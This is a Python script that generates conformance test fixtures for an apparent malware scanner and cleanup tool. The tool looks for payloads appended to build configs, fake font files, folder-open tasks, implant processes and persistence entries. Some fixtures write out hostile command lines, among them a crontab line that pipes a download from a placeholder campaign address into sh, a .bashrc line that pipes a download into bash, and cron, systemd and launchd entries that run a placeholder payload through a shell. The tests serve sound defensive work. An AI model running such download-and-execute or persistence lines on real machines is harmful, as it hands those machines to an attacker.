#!/usr/bin/env python3
"""Generate conformance/cases/*.json.

The cases are generated rather than hand-written so the set stays internally
consistent: one place defines what a fixture looks like, and a reviewer reads
intent rather than JSON punctuation.

No case contains a payload. Fixtures write {{STRONG}}, {{WEAK}}, {{BADPKG}}
and {{PAD}}, and conformance/run.sh substitutes real values from ioc/ when it
builds the tree. Working malware strings stay out of the repository, and the
corpus cannot drift away from the indicator set it is testing.

Host cases describe a machine as well as a tree. They add {{IMPLANT}} (an
implant process name), {{IMPLANT_CUT}} (the same name as the Linux kernel
reports it, 15 bytes) and {{NETIP}} (a campaign address), a `home` map written
under the fixture's home directory, and a `host` map holding the machine's
state as files. See host_state() below.
"""
import json
import os

D = os.path.join(os.path.dirname(os.path.abspath(__file__)), "cases")
os.makedirs(D, exist_ok=True)

# A real font starts with the four ASCII bytes wOF2. That is all the check
# reads, so the fixture needs nothing else to be a valid font for our purposes.
REAL_FONT = "wOF2 followed by bytes that are not checked\n"
FAKE_FONT = "var _0x4a=function(){return 1};\n"

CASES = {}


def case(name, **kw):
    CASES[name] = kw


case(
    "clean-tree",
    why="A clean project reports clean and exits 0.",
    roots=["code"],
    files={
        "code/proj/postcss.config.mjs": "export default { plugins: {} }\n",
        "code/proj/package.json": '{"name":"proj","dependencies":{"react":"^18.0.0"}}\n',
        "code/proj/public/real.woff2": REAL_FONT,
        "code/proj/src/index.js": "export const hello = () => 'world'\n",
    },
    expect={
        "exit": 0,
        "findings": [{"level": "ok", "match": "build config files checked"}],
        "must_not_report": ["[HIT]"],
    },
)

case(
    "config-payload-after-module-end",
    why="The canonical infection: payload appended past the module end, behind padding.",
    roots=["code"],
    files={
        "code/proj/postcss.config.mjs": "export default { plugins: {} }\n{{PAD}}{{STRONG}}\n",
        "code/proj/src/index.js": "export const hello = () => 'world'\n",
    },
    expect={
        "exit": 2,
        "findings": [{
            "level": "HIT",
            "match": "config file contains an indicator",
            "path": "postcss.config.mjs",
        }],
        "must_not_report": ["src/index.js"],
    },
)

case(
    "font-masquerade",
    why="A .woff2 whose bytes are JavaScript is a payload, not a font.",
    roots=["code"],
    files={
        "code/proj/public/fake.woff2": FAKE_FONT,
        "code/proj/public/real.woff2": REAL_FONT,
    },
    expect={
        "exit": 2,
        "findings": [{"level": "HIT", "match": "font file is not a font", "path": "fake.woff2"}],
        "must_not_report": ["real.woff2"],
    },
)

case(
    "lfs-pointer-is-not-a-fake-font",
    why="Git LFS stores a text pointer in place of the font. Flagging it is a "
        "known false positive and must stay fixed.",
    roots=["code"],
    files={
        "code/proj/public/tracked.woff2":
            "version https://git-lfs.github.com/spec/v1\noid sha256:abc123\nsize 1234\n",
    },
    expect={
        "exit": 0,
        "findings": [{"level": "ok", "match": "font files checked"}],
        "must_not_report": ["tracked.woff2"],
    },
)

case(
    "tasks-json-runs-on-folder-open",
    why="A task that runs on folder open needs a human, but is not on its own "
        "a confirmed infection.",
    roots=["code"],
    files={
        "code/proj/.vscode/tasks.json":
            '{"version":"2.0.0","tasks":[{"label":"setup","type":"shell",'
            '"command":"npm ci","runOptions":{"runOn":"folderOpen"}}]}\n',
    },
    expect={
        "exit": 1,
        "findings": [{"level": "review", "match": "runs on folder open", "path": "tasks.json"}],
        "must_not_report": ["[HIT]"],
    },
)

case(
    "tasks-json-folder-open-and-infected",
    why="The same task carrying an indicator is confirmed, not review.",
    roots=["code"],
    files={
        "code/proj/.vscode/tasks.json":
            '{"tasks":[{"runOptions":{"runOn":"folderOpen"},"command":"{{STRONG}}"}]}\n',
    },
    expect={
        "exit": 2,
        "findings": [{
            "level": "HIT",
            "match": "runs on folder open AND contains an indicator",
            "path": "tasks.json",
        }],
    },
)

case(
    "settings-json-is-not-tasks-json",
    why="Only .vscode/tasks.json executes commands. Matching folderOpen in "
        "settings.json is a known false positive.",
    roots=["code"],
    files={
        "code/proj/.vscode/settings.json": '{"workbench.editor.labelFormat":"folderOpen"}\n',
    },
    expect={"exit": 0, "must_not_report": ["settings.json"]},
)

case(
    "known-bad-package-in-lockfile",
    why="A campaign package named in a manifest is confirmed even though "
        "node_modules itself is never walked.",
    roots=["code"],
    files={
        "code/proj/package.json": '{"name":"proj","dependencies":{"{{BADPKG}}":"^1.0.0"}}\n',
    },
    expect={
        "exit": 2,
        "findings": [{
            "level": "HIT",
            "match": "known-bad package referenced",
            "path": "package.json",
        }],
    },
)

case(
    "node-modules-is-not-scanned",
    why="ADR-0004 and ADR-0025: node_modules is pruned, so a payload living "
        "only there is invisible to the content scan. This case exists to make "
        "that limitation explicit and deliberate, not to assert it is desirable.",
    roots=["code"],
    files={
        "code/proj/node_modules/evil/postcss.config.mjs":
            "export default {}\n{{PAD}}{{STRONG}}\n",
        "code/proj/node_modules/evil/public/fake.woff2": FAKE_FONT,
        "code/proj/postcss.config.mjs": "export default { plugins: {} }\n",
    },
    expect={"exit": 0, "must_not_report": ["node_modules", "[HIT]"]},
)

case(
    "payload-in-an-ordinary-source-file-is-not-found",
    why="The machine check is targeted by filename, not a general content grep. "
        "A payload in an arbitrary .js is out of scope here and is caught by the "
        "repository scan instead. Recorded so the port does not silently change "
        "the contract in either direction.",
    roots=["code"],
    files={
        "code/proj/src/vendor.js": "{{PAD}}{{STRONG}}\n",
        "code/proj/postcss.config.mjs": "export default { plugins: {} }\n",
    },
    expect={"exit": 0, "must_not_report": ["[HIT]"]},
)

case(
    "dry-run-changes-nothing",
    why="The single most important property: a default run is read-only, even "
        "on a tree full of confirmed hits.",
    roots=["code"],
    files={
        "code/proj/postcss.config.mjs": "export default {}\n{{PAD}}{{STRONG}}\n",
        "code/proj/public/fake.woff2": FAKE_FONT,
        "code/proj/.vscode/tasks.json":
            '{"tasks":[{"runOptions":{"runOn":"folderOpen"},"command":"{{STRONG}}"}]}\n',
    },
    expect={
        "exit": 2,
        "tree_may_change": False,
        "findings": [{"level": "HIT", "match": "font file is not a font"}],
        "must_not_report": ["quarantined ->"],
    },
)

case(
    "apply-quarantines-and-never-deletes",
    why="--apply moves confirmed artifacts into quarantine with a manifest. "
        "Nothing is ever deleted.",
    roots=["code"],
    apply=True,
    files={
        "code/proj/public/fake.woff2": FAKE_FONT,
        "code/proj/src/index.js": "export const hello = () => 'world'\n",
    },
    expect={
        "exit": 2,
        "tree_may_change": True,
        "quarantined": ["code/proj/public/fake.woff2"],
        "findings": [{"level": "HIT", "match": "font file is not a font"}],
        "must_not_report": ["src/index.js"],
    },
)


# ---------------------------------------------------------------------------
# Host cases. The machine, as data.
#
# These run without --fs-only and with --host-state. The state directory holds
# one file per question the scanner asks of a machine. A file that is ABSENT
# means the question was not answered, and the scan must say so; an empty file
# is the empty answer. That distinction is what most of these cases are about.
# ---------------------------------------------------------------------------

# Every host case scans the same unremarkable tree, so anything it reports
# comes from the machine and not from the files.
ORDINARY_TREE = {"code/proj/src/index.js": "export const hello = () => 'world'\n"}


def host_state(platform="linux", files=None, **answers):
    """A quiet machine: nothing running, nothing scheduled, nothing configured.

    Keyword arguments replace one answer (processes, connections, crontab,
    git_config). Pass None to leave a question unanswered, which is not the
    same as answering it with nothing. `files` adds entries by their path in
    the state directory, for system files under root/ and for `.absent`
    markers.
    """
    state = {
        "platform": platform + "\n",
        "processes": "",
        "connections": "",
        "crontab": "",
        "git-config": "",
        # root/ stands in for / when system directories are read.
        "root/.keep": "",
    }
    for key, value in answers.items():
        state[key.replace("_", "-")] = value
    state.update(files or {})
    return {k: v for k, v in state.items() if v is not None}


def host_case(name, why, expect, host=None, home=None, **kw):
    case(
        name,
        why=why,
        roots=["code"],
        files=ORDINARY_TREE,
        home=home or {},
        host=host if host is not None else host_state(),
        expect=expect,
        **kw,
    )


NOTHING_FOUND = ["[HIT]", "[review]"]

host_case(
    "host-quiet-machine-is-clean",
    why="A machine with nothing running, scheduled or configured is clean, and "
        "every host section says it looked. If this fails, a host check is "
        "making a finding out of nothing and every other host case is noise.",
    expect={
        "exit": 0,
        "findings": [
            {"level": "ok", "match": "no second-stage implant found"},
            {"level": "ok", "match": "user crontab is empty"},
            {"level": "ok", "match": "no global core.hooksPath"},
            {"level": "ok", "match": "no interpreter running inline code"},
            {"level": "ok", "match": "no established node or Electron TCP connections"},
        ],
        "must_not_report": NOTHING_FOUND,
    },
)

host_case(
    "host-nothing-supplied-is-not-clean",
    why="The failure this whole boundary exists to prevent: a question that "
        "was never answered read as an empty answer. A state directory that "
        "only names a platform must produce a review item per unanswered "
        "question and must not exit 0.",
    host={"platform": "linux\n"},
    expect={
        "exit": 1,
        "findings": [
            {"level": "review", "match": "could not read the process table, so a running implant was not looked for"},
            {"level": "review", "match": "could not read the process table, so resident interpreters were not checked"},
            {"level": "review", "match": "system-wide persistence was not checked"},
            {"level": "review", "match": "could not read the user crontab"},
            {"level": "review", "match": "could not read the global git configuration"},
            {"level": "review", "match": "could not list connections"},
        ],
        "must_not_report": ["[HIT]"],
    },
)

host_case(
    "host-implant-process-running",
    why="The implant sets its own process title, so the process table is a "
        "finding with nothing on disk. macOS reports the executable's full "
        "path, spaces included, and the name is its last component.",
    host=host_state(
        "macos",
        processes="1\t/sbin/launchd\t/sbin/launchd\n"
                  "4242\t/Users/x/Library/Application Support/{{IMPLANT}}\t"
                  "/Users/x/Library/Application Support/{{IMPLANT}}\n",
    ),
    expect={
        "exit": 2,
        "findings": [{"level": "HIT", "match": "an implant process is running now"}],
    },
)

host_case(
    "host-implant-name-cut-by-the-linux-kernel",
    why="Linux keeps 15 bytes of a process name. The implant's is longer, so "
        "ps shows it cut short and a whole-name comparison never matches. "
        "Observed in the sandbox, not assumed: a binary run under the full "
        "name appears as the first 15 bytes. The shell check compares whole "
        "names and has therefore never matched on Linux. A name of exactly "
        "15 bytes that begins a longer implant name is that implant.",
    host=host_state(
        "linux",
        processes="1\tsystemd\t/sbin/init\n"
                  "4242\t{{IMPLANT_CUT}}\t/home/x/.local/share/{{IMPLANT}}\n",
    ),
    expect={
        "exit": 2,
        "findings": [{"level": "HIT", "match": "an implant process is running now"}],
    },
)

host_case(
    "host-mentioning-the-implant-is-not-running-it",
    why="The process NAME is compared, never the command line. An "
        "administrator grepping for the implant, or an editor with a file "
        "named after it, mentions it without being it. Matching the command "
        "line once reported the operator's own shell as the implant.",
    host=host_state(
        "linux",
        processes="10\tgrep\tgrep -r {{IMPLANT}} /home/x\n"
                  "11\tvim\tvim notes-about-{{IMPLANT}}.txt\n",
    ),
    expect={"exit": 0, "must_not_report": NOTHING_FOUND},
)

host_case(
    "host-systemd-unit-with-indicator",
    why="A user unit carrying an indicator is confirmed persistence. The run "
        "is a dry run, so the unit must still be where it was afterwards: the "
        "home directory is part of what a read-only scan leaves alone.",
    home={
        ".config/systemd/user/updater.service":
            "[Service]\nExecStart=/bin/sh -c '{{STRONG}}'\n",
        ".config/systemd/user/backup.timer": "[Timer]\nOnCalendar=daily\n",
    },
    expect={
        "exit": 2,
        "tree_may_change": False,
        "findings": [{
            "level": "HIT",
            "match": "systemd unit contains an indicator",
            "path": "updater.service",
        }],
        "must_not_report": ["backup.timer", "quarantined ->"],
        # A login item is outside the projects: the payload ran here, and the
        # next steps must say rebuild and give the command that contains it.
        "must_print": ["WHAT TO DO NEXT", "The payload ran on this machine",
                       "polinrider check --apply", "Rebuild this machine from a clean install"],
    },
)

host_case(
    "host-apply-quarantines-a-launch-item",
    why="--apply moves a confirmed launch item out of the home directory and "
        "into quarantine with a manifest. Moved, never deleted, the same "
        "promise the filesystem checks make.",
    apply=True,
    host=host_state("macos"),
    home={
        "Library/LaunchAgents/com.example.updater.plist":
            "<plist><dict><key>ProgramArguments</key>"
            "<array><string>{{STRONG}}</string></array></dict></plist>\n",
    },
    expect={
        "exit": 2,
        "tree_may_change": True,
        "home_quarantined": ["Library/LaunchAgents/com.example.updater.plist"],
        "findings": [{
            "level": "HIT",
            "match": "launch item contains an indicator",
            "path": "com.example.updater.plist",
        }],
    },
)

host_case(
    "host-system-cron-entry-with-indicator",
    why="System-wide persistence is read through the same boundary as the "
        "process table: root/ stands in for /. A cron.d entry carrying an "
        "indicator is confirmed.",
    host=host_state(
        "linux",
        files={"root/etc/cron.d/sysupdate": "*/10 * * * * root /bin/sh -c '{{STRONG}}'\n"},
    ),
    expect={
        "exit": 2,
        "findings": [{
            "level": "HIT",
            "match": "system cron entry contains an indicator",
            "path": "sysupdate",
        }],
    },
)

host_case(
    "host-user-crontab-is-review",
    why="An ordinary crontab is not evidence of anything, and it is also "
        "exactly where persistence goes. A human reads it: review, not a hit, "
        "and not silence.",
    host=host_state(crontab="0 3 * * * /usr/local/bin/backup\n"),
    expect={
        "exit": 1,
        "findings": [{"level": "review", "match": "user crontab is not empty"}],
        "must_not_report": ["[HIT]"],
        "must_print": ["WHAT TO DO NEXT", "Nothing is confirmed"],
        "must_not_print": ["Rebuild this machine"],
    },
)

host_case(
    "host-user-crontab-naming-the-controller",
    why="A crontab line that calls a campaign address has no innocent "
        "reading. The shell left every non-empty crontab at review while "
        "calling the same content in a cron.d file or a unit a hit; this is "
        "that inconsistency settled in favour of the hit.",
    host=host_state(crontab="*/5 * * * * curl -s http://{{NETIP}}/u | sh\n"),
    expect={
        "exit": 2,
        "findings": [{"level": "HIT", "match": "user crontab contains an indicator"}],
    },
)

host_case(
    "host-no-crontab-command-is-its-own-answer",
    why="A machine without a crontab command has no user crontab to run, "
        "which is a different statement from 'it was empty' and from 'it "
        "could not be read'. It is not a review item, or every container and "
        "minimal install would exit 1.",
    host=host_state(crontab=None, files={"crontab.absent": ""}),
    expect={
        "exit": 0,
        "findings": [{"level": "ok", "match": "no crontab command on this machine"}],
        "must_not_report": NOTHING_FOUND,
    },
)

host_case(
    "host-shell-startup-pipes-a-download",
    why="A startup file that pipes a download into a shell runs somebody "
        "else's code at every login. Nobody writes that line by accident.",
    home={".bashrc": "export PATH=$HOME/bin:$PATH\ncurl -fsSL http://example.invalid/i.sh | bash\n"},
    expect={
        "exit": 2,
        "findings": [{
            "level": "HIT",
            "match": "shell startup file pipes a download into an interpreter",
            "path": ".bashrc",
        }],
    },
)

host_case(
    "host-shell-startup-checksum-and-comment-are-clean",
    why="A false COMPROMISED is worse than a missed review. The shell's "
        "pattern ended at 'sh' without asking what followed, so piping a "
        "download into shasum, which is how a careful person verifies one, "
        "matched as piping into sh. A commented-out install line runs nothing. "
        "Both must stay clean.",
    home={
        ".zshrc":
            "alias verify='curl -sL http://example.invalid/f | shasum -a 256'\n"
            "# curl -fsSL http://example.invalid/install.sh | bash\n",
    },
    expect={
        "exit": 0,
        "findings": [{"level": "ok", "match": "clean:", "path": ".zshrc"}],
        "must_not_report": NOTHING_FOUND,
    },
)

host_case(
    "host-private-npm-registry-is-review-not-compromise",
    why="The shell called any registry other than npmjs.org a confirmed hit, "
        "which tells every company with an internal registry that the machine "
        "must be rebuilt. It is worth a human confirming the registry is "
        "theirs; it is not evidence of this campaign.",
    home={".npmrc": "registry=https://npm.corp.example/\n"},
    expect={
        "exit": 1,
        "findings": [{
            "level": "review",
            "match": "a non-default npm registry is configured",
            "path": "npm.corp.example",
        }],
        "must_not_report": ["[HIT]"],
    },
)

host_case(
    "host-npm-token-is-redacted",
    why="The scan reads ~/.npmrc and prints it. A token it read must not be a "
        "token it wrote into a report that gets attached to a ticket. Owning "
        "a token is inventory, not a finding.",
    home={".npmrc": "//registry.npmjs.org/:_authToken=npm_NOTAREALTOKEN0000000000\n"},
    expect={
        "exit": 0,
        "findings": [{"level": "info", "match": "an npm auth token is stored on disk"}],
        "must_not_report": NOTHING_FOUND,
        "must_not_print": ["npm_NOTAREALTOKEN0000000000"],
    },
)

host_case(
    "host-inline-interpreter-is-review",
    why="node -e and python -c are how the first stage runs, and also how "
        "editors and coding agents run things all day. Review, with the "
        "command line shown. A node process running a file is ordinary and "
        "is not listed.",
    host=host_state(
        processes="50\tnode\tnode /srv/app/server.js\n"
                  "51\tnode\tnode -e console.log(1)\n",
    ),
    expect={
        "exit": 1,
        "findings": [{
            "level": "review",
            "match": "an interpreter is running code passed on the command line",
        }],
        "must_not_report": ["[HIT]", "server.js"],
    },
)

host_case(
    "host-connection-to-campaign-from-any-process",
    why="The shell looked only at sockets held by node and Electron. The "
        "second stage is a native binary under its own name, so its "
        "connection to the controller was never examined. A live connection "
        "to a campaign address is confirmed whatever holds it.",
    host=host_state(
        connections='ESTAB 0 0 10.0.0.2:40000 198.51.100.4:443 users:(("node",pid=9,fd=20))\n'
                    'ESTAB 0 0 10.0.0.2:40001 {{NETIP}}:443 users:(("updater",pid=8,fd=3))\n',
    ),
    expect={
        "exit": 2,
        "findings": [{
            "level": "HIT",
            "match": "live connection to known campaign infrastructure",
        }],
    },
)

host_case(
    "host-address-containing-a-campaign-address-is-not-a-hit",
    why="A fixed-string match for an address also matches every address that "
        "contains it: one more digit on the end, or one more on the front, is "
        "somebody else's server. The fixture address need not be a valid one; "
        "what it tests is that the match ends where the address ends. A "
        "connection to a neighbour must not report the machine compromised.",
    host=host_state(
        connections='ESTAB 0 0 10.0.0.2:40001 {{NETIP}}9:443 users:(("node",pid=8,fd=3))\n'
                    'ESTAB 0 0 10.0.0.2:40002 1{{NETIP}}:443 users:(("node",pid=8,fd=4))\n',
    ),
    expect={
        "exit": 0,
        "findings": [{"level": "ok", "match": "none to known campaign infrastructure"}],
        "must_not_report": NOTHING_FOUND,
    },
)

host_case(
    "host-no-socket-tool-is-said-not-passed",
    why="With neither ss nor netstat there is no connection list, and no "
        "list is not the same as no connections. The section must say it was "
        "skipped and the run must not exit 0 on the strength of it.",
    host=host_state(connections=None, files={"connections.absent": ""}),
    expect={
        "exit": 1,
        "findings": [{"level": "review", "match": "skipped"}],
        "must_not_report": ["[HIT]"],
    },
)

host_case(
    "host-global-hooks-path-is-review",
    why="A global core.hooksPath runs a script in every repository on the "
        "machine, on every commit. Some people set one on purpose, so it is "
        "review; it is never passed over.",
    host=host_state(git_config="user.name=Someone\ncore.hookspath=/home/x/.hooks\n"),
    expect={
        "exit": 1,
        "findings": [{
            "level": "review",
            "match": "global core.hooksPath is set to",
            "path": "/home/x/.hooks",
        }],
        "must_not_report": ["[HIT]"],
    },
)


# ---------------------------------------------------------------------------
# Clean cases. The one command that changes the contents of a source file.
#
# `polinrider clean` strips a payload that was appended to a build config and
# keeps the original in quarantine. It recognises one shape and refuses the
# rest, so half of these are about what it must leave alone.
# ---------------------------------------------------------------------------

CLEAN_CONFIG = "export default { plugins: {} }\n"
INFECTED_CONFIG = CLEAN_CONFIG + "{{PAD}}{{STRONG}}\n"

case(
    "clean-dry-run-shows-the-cut-and-changes-nothing",
    why="Dry run by default holds for clean too, and matters more: this is "
        "the command that edits source. Without --apply it shows the last "
        "line it would keep and the start of what it would cut, and the tree "
        "is byte for byte what it was.",
    command="clean",
    roots=["code"],
    files={"code/proj/postcss.config.mjs": INFECTED_CONFIG},
    expect={
        "exit": 2,
        "tree_may_change": False,
        "findings": [{
            "level": "HIT",
            "match": "config file contains an indicator",
            "path": "postcss.config.mjs",
        }],
        "must_print": ["would strip", "keeps through line 1",
                       "WHAT TO DO NEXT", "polinrider clean --apply",
                       "Decide whether this machine needs rebuilding"],
        "must_not_print": ["original kept ->"],
    },
)

case(
    "clean-strips-a-payload-appended-on-its-own-line",
    why="The canonical infection, undone. The module is kept whole, the "
        "padding and the payload go, and the infected original is in "
        "quarantine so the change can be put back. Exit 2, because the exit "
        "code reports what was found, and a confirmed indicator was.",
    command="clean",
    apply=True,
    roots=["code"],
    files={"code/proj/postcss.config.mjs": INFECTED_CONFIG},
    expect={
        "exit": 2,
        "tree_may_change": True,
        "stripped": ["code/proj/postcss.config.mjs"],
        "file_after": {"code/proj/postcss.config.mjs": CLEAN_CONFIG},
        "must_print": ["stripped", "original kept ->"],
    },
)

case(
    "clean-strips-a-payload-on-the-module-line",
    why="The form that hides best: the padding follows the closing bracket "
        "on the same line and pushes the payload off the edge of the editor. "
        "The cut must leave that line intact and ended.",
    command="clean",
    apply=True,
    roots=["code"],
    files={
        "code/proj/next.config.js":
            "module.exports = { reactStrictMode: true };{{PAD}}{{STRONG}}\n",
    },
    expect={
        "exit": 2,
        "tree_may_change": True,
        "stripped": ["code/proj/next.config.js"],
        "file_after": {
            "code/proj/next.config.js": "module.exports = { reactStrictMode: true };\n",
        },
    },
)

UNCOMMITTED = (
    "import tailwind from 'tailwindcss'\n"
    "\n"
    "// half-finished: trying the new plugin order\n"
    "const extra = [1, 2, 3]\n"
    "\n"
    "export default {\n"
    "  plugins: [tailwind, ...extra],\n"
    "}\n"
)

case(
    "clean-keeps-uncommitted-work-and-never-touches-git",
    why="The reason this command exists. The alternative is 'delete the clone "
        "and re-clone', which throws away whatever was not pushed. Work in "
        "the infected file itself survives byte for byte, other files are "
        "not opened for writing, and nothing under .git changes: no pull, no "
        "reset, no stash, no staging. A cleanup tool that runs git inside a "
        "repository an attacker wrote to is taking orders from its config.",
    command="clean",
    apply=True,
    roots=["code"],
    files={
        "code/proj/postcss.config.mjs": UNCOMMITTED + "{{PAD}}{{STRONG}}\n",
        "code/proj/src/draft.js": "// not committed yet\nexport const wip = true\n",
        "code/proj/.git/HEAD": "ref: refs/heads/main\n",
        "code/proj/.git/index": "DIRC fixture bytes, never parsed\n",
        "code/proj/.git/config": "[core]\n\tbare = false\n",
    },
    expect={
        "exit": 2,
        "tree_may_change": True,
        "stripped": ["code/proj/postcss.config.mjs"],
        "file_after": {
            "code/proj/postcss.config.mjs": UNCOMMITTED,
            "code/proj/src/draft.js": "// not committed yet\nexport const wip = true\n",
            "code/proj/.git/HEAD": "ref: refs/heads/main\n",
            "code/proj/.git/index": "DIRC fixture bytes, never parsed\n",
            "code/proj/.git/config": "[core]\n\tbare = false\n",
        },
        "must_print": ["It does not touch git"],
    },
)

case(
    "clean-refuses-a-payload-inside-the-module",
    why="Appended is the only shape it cuts. Here the payload sits inside "
        "the object literal with the project's own code after it, and "
        "cutting to the end of the file would take that code too. A cleanup "
        "that breaks the build has made the incident worse. Reported, not "
        "edited, even under --apply.",
    command="clean",
    apply=True,
    roots=["code"],
    files={
        "code/proj/vite.config.js":
            "module.exports = {{{PAD}}{{STRONG}}\n  plugins: [],\n}\n",
    },
    expect={
        "exit": 2,
        "tree_may_change": False,
        "findings": [{
            "level": "HIT",
            "match": "config file contains an indicator",
            "path": "vite.config.js",
        }],
        "must_print": ["not stripped", "re-clone"],
        "must_not_print": ["original kept ->"],
    },
)

case(
    "clean-refuses-a-payload-that-is-not-behind-padding",
    why="An indicator on a line of its own after the module may well be a "
        "payload. It is not the shape this campaign is known to use, and "
        "editing somebody's source on a guess is not something a tool that "
        "asks to be trusted mid-incident gets to do. It says why and leaves "
        "the file.",
    command="clean",
    apply=True,
    roots=["code"],
    files={"code/proj/eslint.config.mjs": "export default []\nvar x = '{{STRONG}}'\n"},
    expect={
        "exit": 2,
        "tree_may_change": False,
        "must_print": ["not stripped", "not behind the padding"],
    },
)

case(
    "clean-quarantines-what-check-would",
    why="clean is check plus one thing, not a different scanner. A fake font "
        "in the same repository is moved to quarantine exactly as "
        "check --apply moves it.",
    command="clean",
    apply=True,
    roots=["code"],
    files={
        "code/proj/postcss.config.mjs": INFECTED_CONFIG,
        "code/proj/public/fake.woff2": FAKE_FONT,
    },
    expect={
        "exit": 2,
        "tree_may_change": True,
        "stripped": ["code/proj/postcss.config.mjs"],
        "quarantined": ["code/proj/public/fake.woff2"],
        "findings": [{"level": "HIT", "match": "font file is not a font"}],
    },
)

case(
    "check-apply-still-never-edits-a-file",
    why="ADR-0031 adds a command; it does not change what an existing one "
        "means. check --apply moves confirmed artifacts and never rewrites "
        "the contents of anything. An infected config is reported and left "
        "exactly as it was, under both implementations.",
    apply=True,
    roots=["code"],
    files={"code/proj/postcss.config.mjs": INFECTED_CONFIG},
    expect={
        "exit": 2,
        "tree_may_change": False,
        "findings": [{
            "level": "HIT",
            "match": "config file contains an indicator",
            "path": "postcss.config.mjs",
        }],
        "must_not_print": ["original kept ->", "stripped "],
    },
)


# ---------------------------------------------------------------------------
# Guide cases. A whole session, driven by its answers.
#
# `stdin` is what the operator types, one answer per line. {{TREE}} is the
# fixture tree. What these pin is the promise on the first screen: nothing is
# changed unless you type yes.
# ---------------------------------------------------------------------------

FOLDER = ["2", "{{TREE}}/code", ""]     # a folder, this one, start

case(
    "guide-strips-only-after-an-explicit-yes",
    why="The whole flow in one session: choose a folder, scan, see what would "
        "be cut, type yes, and it is cut with the original kept, then checked "
        "again. Exit 2 although the files end clean, because the session "
        "found a confirmed indicator and a script reading the exit code must "
        "not be told nothing happened.",
    command="guide",
    apply=True,
    roots=["code"],
    stdin=FOLDER + ["yes", ""],
    files={"code/proj/postcss.config.mjs": INFECTED_CONFIG},
    expect={
        "exit": 2,
        "tree_may_change": True,
        "stripped": ["code/proj/postcss.config.mjs"],
        "file_after": {"code/proj/postcss.config.mjs": CLEAN_CONFIG},
        "must_print": ["Step 4 of 6", "Checking again", "a DIFFERENT machine"],
    },
)

case(
    "guide-changes-nothing-without-a-yes",
    why="Enter is not yes. 'sure' is not yes. Each asks again, and no leaves "
        "the tree byte for byte as it was. A prompt that treats anything "
        "short of no as consent will one day be answered by a stray keypress.",
    command="guide",
    roots=["code"],
    stdin=FOLDER + ["", "sure", "no", ""],
    files={"code/proj/postcss.config.mjs": INFECTED_CONFIG},
    expect={
        "exit": 2,
        "tree_may_change": False,
        "must_print": ["Type yes or no", "Left as it is"],
        "must_not_print": ["original kept ->", "Checking again"],
    },
)

case(
    "guide-stops-safely-when-input-ends",
    why="Input can end mid-session: a closed terminal, a pipe that ran dry. "
        "The end of input is not an empty line and is certainly not a yes. "
        "The session stops where it is, changes nothing further and says so. "
        "The shell version once read its own scan data as the answer to a "
        "prompt (ADR-0024); here running out of answers can only ever stop.",
    command="guide",
    roots=["code"],
    stdin=FOLDER,
    files={"code/proj/postcss.config.mjs": INFECTED_CONFIG},
    expect={
        "exit": 2,
        "tree_may_change": False,
        "must_print": ["Input ended"],
        "must_not_print": ["original kept ->"],
    },
)

case(
    "guide-quit-before-a-scan-is-not-a-clean-result",
    why="Leaving at the first question scanned nothing. Exit 0 would tell a "
        "script the machine is clean; exit 3 says the scan did not run, which "
        "is what happened.",
    command="guide",
    roots=["code"],
    stdin=["q"],
    files={"code/proj/postcss.config.mjs": INFECTED_CONFIG},
    expect={
        "exit": 3,
        "tree_may_change": False,
        "must_print": ["Nothing was scanned"],
    },
)

case(
    "guide-clean-folder-never-asks-to-change-anything",
    why="With nothing found there is nothing to consent to, so the question "
        "is never put. A clean folder goes straight to the prevention advice "
        "and exits 0.",
    command="guide",
    roots=["code"],
    stdin=FOLDER,
    files=ORDINARY_TREE,
    expect={
        "exit": 0,
        "tree_may_change": False,
        "must_print": ["Step 6 of 6"],
        "must_not_print": ["Type yes"],
        "must_not_report": NOTHING_FOUND,
    },
)

host_case(
    "guide-this-computer-offers-only-what-it-can-do",
    why="A running implant cannot be moved into quarantine. The flow reports "
        "it, says plainly that nothing here can be done for you, and does not "
        "put a yes/no question that has no yes. It still walks the credential "
        "step, which is the part that matters most after a hit.",
    command="guide",
    stdin=["1", "{{TREE}}/code", "", ""],
    host=host_state(processes="4242\t{{IMPLANT_CUT}}\t/home/x/.local/share/{{IMPLANT}}\n"),
    expect={
        "exit": 2,
        "tree_may_change": False,
        "findings": [{"level": "HIT", "match": "an implant process is running now"}],
        "must_print": ["Nothing found here can be moved or stripped", "a DIFFERENT machine"],
        "must_not_print": ["Type yes"],
    },
)

for name, body in CASES.items():
    with open(os.path.join(D, name + ".json"), "w") as f:
        json.dump(body, f, indent=2)
        f.write("\n")

print(f"{len(CASES)} cases written to {D}")
